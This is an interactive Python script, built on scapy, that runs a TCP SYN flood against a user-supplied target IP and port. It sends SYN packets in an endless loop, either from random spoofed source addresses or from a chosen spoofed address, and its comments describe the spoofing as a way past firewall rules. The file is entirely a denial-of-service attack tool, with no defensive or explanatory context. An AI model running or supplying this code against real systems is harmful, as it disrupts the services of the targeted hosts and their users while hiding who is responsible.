import ipaddress
from scapy.all import *
from scapy.layers.inet import IP, TCP
# Random mode will use random source IP addresses for the SYN flood
# Precise mode will use a given IP address, helpful for overcoming some firewall rules
mode = input("Y/N, would you like to run this tool in random mode?:")

# Target IP and port number
target = input("Enter the target IP address:")
target = ipaddress.IPv4Address(target)
target_port = input("Enter the target port number:")

#  Source port and IP address
source_port = input("Enter the source port number:")

if mode == "N":
    source_address = input("Enter the source IP address:")

# This function will use a random source address for the SYN flood attack
def random_mode(target, dport, sport):
    source_address = RandIP()
    packet = IP(src= source_address, dst= target)/ TCP(sport=sport, dport=dport, seq=13025, flags="S")

    # Sending the packet over and over again
    while True:
        send(packet)

# SYN flood with specified source address
def precise_mode(target, dport, sport, source_address):
    packet = IP(src= source_address, dst= target)/ TCP(sport= sport, dport= dport, seq=13025, flags="S")

    # Sending the packet to the host
    while True:
        send(packet)

def main():
    if mode == 'Y':
        random_mode(target, target_port, source_port)
    elif mode == 'N':
        precise_mode(target, target_port, source_port, source_address)
    else:
        print("Invalid input")

main()



